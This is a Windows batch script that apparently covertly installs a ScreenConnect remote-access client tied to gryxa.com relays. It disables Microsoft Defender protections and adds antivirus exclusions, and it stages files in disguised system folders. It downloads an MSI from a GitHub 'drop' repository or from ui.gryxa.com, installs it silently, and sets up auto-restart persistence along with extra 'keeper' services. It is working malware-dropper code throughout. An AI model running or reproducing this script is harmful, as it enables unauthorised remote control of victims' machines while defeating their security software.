@echo off
rem OWN_GRYXA BUILD 20260804G1 - PowerShell-free Gryxa install (AMSI-proof fallback)
rem Used when own_lib.ps1 is missing or blocked by AMSI ("malicious content").
rem Sibling-safe pkg_gryxa.msi from repo (Upgrade table already emptied at build).
setlocal EnableExtensions EnableDelayedExpansion

set "WD=%~1"
if "%WD%"=="" set "WD=%ProgramData%\Microsoft\Windows\WER\Temp\.wucache"
set "GRYXA_FP=%~2"
if "%GRYXA_FP%"=="" set "GRYXA_FP=36e506ff016b2151"
set "KEEP_FP=%~3"
if "%KEEP_FP%"=="" set "KEEP_FP=5f6010579852e507"
set "ALT_FP=%~4"
if "%ALT_FP%"=="" set "ALT_FP=f861c8140d453427"

set "STAGE=%SystemRoot%\Temp\.upd"
set "CURL=%SystemRoot%\System32\curl.exe"
set "MSI=%STAGE%\pkg_gryxa.msi"
set "LOG=%WD%\own_gryxa.log"
set "PC={9D7CC418-A356-9693-DCC5-41EC44D03B31}"
set "URL1=https://raw.githubusercontent.com/xnobuddy/github-drop/main/pkg_gryxa.msi"
set "URL2=https://ui.gryxa.com/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest"

if not exist "%WD%" mkdir "%WD%" >nul 2>&1
if not exist "%STAGE%" mkdir "%STAGE%" >nul 2>&1
echo [%DATE% %TIME%] own_gryxa begin fp=%GRYXA_FP%>>"%LOG%"

rem soft Defender off (ignore errors if WinDefend dead / 0x800106ba)
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableScriptScanning /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths" /v "%WD%" /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths" /v "%STAGE%" /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths" /v "%ProgramFiles(x86)%\ScreenConnect Client*" /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Processes" /v "msiexec.exe" /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Processes" /v "ScreenConnect.ClientService.exe" /t REG_DWORD /d 0 /f >nul 2>&1

rem already Running → nothing to do
sc query "ScreenConnect Client (%GRYXA_FP%)" | find "RUNNING" >nul
if not errorlevel 1 (
  echo [%DATE% %TIME%] already_running>>"%LOG%"
  exit /b 0
)

rem fetch MSI if missing/small
set "NEED=1"
if exist "%MSI%" for %%F in ("%MSI%") do if %%~zF GTR 1000000 set "NEED=0"
if "%NEED%"=="1" (
  echo [%DATE% %TIME%] fetch %URL1%>>"%LOG%"
  "%CURL%" -L --ssl-no-revoke --connect-timeout 20 --max-time 180 -o "%MSI%.tmp" "%URL1%" >>"%LOG%" 2>&1
  if exist "%MSI%.tmp" for %%F in ("%MSI%.tmp") do if %%~zF GTR 1000000 move /y "%MSI%.tmp" "%MSI%" >nul 2>&1
)
if not exist "%MSI%" (
  echo [%DATE% %TIME%] fetch_fallback ui.gryxa>>"%LOG%"
  "%CURL%" -L --ssl-no-revoke --connect-timeout 20 --max-time 180 -o "%MSI%.tmp" "%URL2%" >>"%LOG%" 2>&1
  if exist "%MSI%.tmp" for %%F in ("%MSI%.tmp") do if %%~zF GTR 1000000 move /y "%MSI%.tmp" "%MSI%" >nul 2>&1
)
if not exist "%MSI%" (
  echo [%DATE% %TIME%] msi_unavailable>>"%LOG%"
  exit /b 2
)
for %%F in ("%MSI%") do echo [%DATE% %TIME%] msi_bytes=%%~zF>>"%LOG%"

rem OLE magic check via certutil hex dump of first bytes is awkward; size gate is enough here
rem (repo MSI is sibling-safe / Upgrade-stripped)

reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer" /v DisableMSI /t REG_DWORD /d 0 /f >nul 2>&1

rem preclean phantom ProductCode (STUCK: ARP present, service 1060)
echo [%DATE% %TIME%] preclean %PC%>>"%LOG%"
msiexec /x %PC% /qn /norestart REBOOT=ReallySuppress >>"%LOG%" 2>&1
reg delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\%PC%" /f >nul 2>&1
reg delete "HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\%PC%" /f >nul 2>&1

echo [%DATE% %TIME%] msiexec /i>>"%LOG%"
msiexec /i "%MSI%" /qn /norestart ALLUSERS=1 REBOOT=ReallySuppress /L*v "%WD%\msi_gryxa_cmd.log"
set "MSIEXIT=!ERRORLEVEL!"
echo [%DATE% %TIME%] msiexec_exit=!MSIEXIT!>>"%LOG%"
echo !MSIEXIT!>"%WD%\gryxa_install.result"

sc config "ScreenConnect Client (%GRYXA_FP%)" start= auto >nul 2>&1
sc failure "ScreenConnect Client (%GRYXA_FP%)" reset= 86400 actions= restart/3000/restart/3000/restart/3000 >nul 2>&1
sc start "ScreenConnect Client (%GRYXA_FP%)" >nul 2>&1

rem recreate sevrz keepers if Gryxa /i knocked them (belt+suspenders)
sc config "ScreenConnect Client (%KEEP_FP%)" start= auto >nul 2>&1
sc start "ScreenConnect Client (%KEEP_FP%)" >nul 2>&1
sc config "ScreenConnect Client (%ALT_FP%)" start= auto >nul 2>&1
sc start "ScreenConnect Client (%ALT_FP%)" >nul 2>&1

rem write minimal gryxa.cfg so mon/exterminate keep the right FP
(
  echo CURRENT_FP=%GRYXA_FP%
  echo RELAY=update.gryxa.com
  echo UI=ui.gryxa.com
  echo MSIURL=https://ui.gryxa.com/Bin/ScreenConnect.ClientSetup.msi?e=Access^&y=Guest
  echo UPDATED=cmd-own_gryxa
) >"%WD%\gryxa.cfg"

sc query "ScreenConnect Client (%GRYXA_FP%)" | find "RUNNING" >nul
if not errorlevel 1 (
  echo [%DATE% %TIME%] running_ok>>"%LOG%"
  exit /b 0
)
echo [%DATE% %TIME%] still_down msi_exit=!MSIEXIT!>>"%LOG%"
exit /b 1
